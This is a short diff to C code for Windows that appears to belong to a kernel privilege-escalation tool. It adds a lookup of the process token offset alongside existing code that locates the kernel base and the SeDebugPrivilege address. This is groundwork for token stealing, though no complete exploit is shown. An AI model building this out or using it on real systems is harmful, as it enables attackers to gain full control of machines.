@@ -18,6 +18,7 @@ DWORD64 NTOKernelBase;
 HMODULE NTOUserBase;
 DWORD64 SeDebugPrivilegeAddr;
 DWORD64 SeDebugPrivilegeAddrOffset;
+DWORD64 TokenOffset;
 
 int main()
 {
@@ -47,6 +48,9 @@ int main()
     SeDebugPrivilegeAddr = NTOKernelBase + SeDebugPrivilegeAddrOffset;
     printf("[+] SeDebugPrivilege offset: %llx\n", SeDebugPrivilegeAddrOffset);
     printf("[+] SeDebugPrivilege: %llx\n", SeDebugPrivilegeAddr);
+
+    TokenOffset = FindTokenOffset(NTOUserBase);
+    printf("[+] Token offset: %llx\n", TokenOffset);
 
     LPCWSTR NtoPath = L"\\SystemRoot\\system32\\ntoskrnl.exe";
     WCHAR ExpandedPath[MAXIMUM_FILENAME_LENGTH];
